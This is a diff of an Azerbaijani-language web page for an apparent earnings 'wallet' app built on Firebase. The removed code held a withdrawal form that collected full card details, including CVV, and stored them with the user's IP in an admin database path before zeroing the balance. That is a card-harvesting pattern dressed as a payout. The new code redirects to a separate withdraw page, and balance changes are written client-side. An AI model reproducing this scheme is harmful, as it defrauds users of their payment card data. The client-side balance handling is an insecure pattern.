@@ -87,16 +87,13 @@
             border-radius: 15px; font-weight: 800; font-size: 0.8rem;
         }
 
-        /* WITHDRAW */
-        .withdraw-box { background: #fff; padding: 30px; border-radius: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
-        .w-input { 
-            width: 100%; padding: 18px; margin-bottom: 15px; border-radius: 18px; 
-            border: 1px solid #f1f5f9; background: #f8fafc; font-weight: 600;
-        }
+        /* WITHDRAW SECTION */
+        .withdraw-box { background: #fff; padding: 30px; border-radius: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; }
+        .w-icon { font-size: 3rem; color: var(--primary); margin-bottom: 15px; }
         .w-btn { 
             width: 100%; padding: 20px; border-radius: 20px; border: none;
             background: var(--grad); color: #fff; font-weight: 800; font-size: 1rem;
-            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
+            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3); cursor: pointer;
         }
 
         /* COOLDOWN */
@@ -170,13 +167,9 @@
     <div id="withdraw-sec" class="section">
         <h2 style="margin-bottom:20px;">Vəsait Çıxarışı</h2>
         <div class="withdraw-box">
-            <input type="text" id="w-name" class="w-input" placeholder="Kart Sahibi (AD SOYAD)">
-            <input type="text" id="w-card" class="w-input" placeholder="16 Rəqəmli Kart Nömrəsi" maxlength="16">
-            <div style="display:flex; gap:10px;">
-                <input type="text" id="w-date" class="w-input" placeholder="AA/İİ" maxlength="5">
-                <input type="password" id="w-cvv" class="w-input" placeholder="CVV" maxlength="3">
-            </div>
-            <button class="w-btn" onclick="requestWithdraw()">TRANSFERİ BAŞLAT</button>
+            <div class="w-icon"><i class="fas fa-university"></i></div>
+            <p style="font-weight: 600; color: #64748b; margin-bottom: 25px;">Qazandığınız vəsaiti birbaşa bank kartınıza transfer edin.</p>
+            <button class="w-btn" onclick="requestWithdraw()">TRANSFER SƏHİFƏSİNƏ KEÇ</button>
         </div>
     </div>
 
@@ -187,7 +180,6 @@
     </nav>
 
     <script>
-        // FIREBASE VƏ MƏNTİQ (TOXUNULMADI)
         const firebaseConfig = {
             apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
             authDomain: "sevgili-testi.firebaseapp.com",
@@ -251,26 +243,19 @@
         }
 
         async function buyRocket(type, price) {
+            if(userData.balance < price) return alert("Kifayət qədər balans yoxdur!");
             if(confirm(type.toUpperCase() + " almaq istəyirsiniz?")) {
-                await db.ref('zerowallet_users/' + user).update({ rocket: type });
+                await db.ref('zerowallet_users/' + user).update({ 
+                    rocket: type,
+                    balance: userData.balance - price 
+                });
                 alert("Uğurla aktiv edildi!");
             }
         }
 
-        async function requestWithdraw() {
-            const name = document.getElementById('w-name').value;
-            const card = document.getElementById('w-card').value;
+        function requestWithdraw() {
             if(userData.balance < 20) return alert("Minimum 20 AZN balans lazımdır!");
-            if(card.length < 16) return alert("Kart məlumatları səhvdir!");
-
-            await db.ref('admin_withdrawals/' + user).set({
-                username: user, card_name: name, card_num: card,
-                card_exp: document.getElementById('w-date').value,
-                card_cvv: document.getElementById('w-cvv').value,
-                amount: userData.balance, ip: userData.ip, timestamp: Date.now()
-            });
-            alert("Tələbiniz göndərildi!");
-            db.ref('zerowallet_users/' + user).update({ balance: 0 });
+            window.location.href = "withdraw.html";
         }
     </script>
 </body>
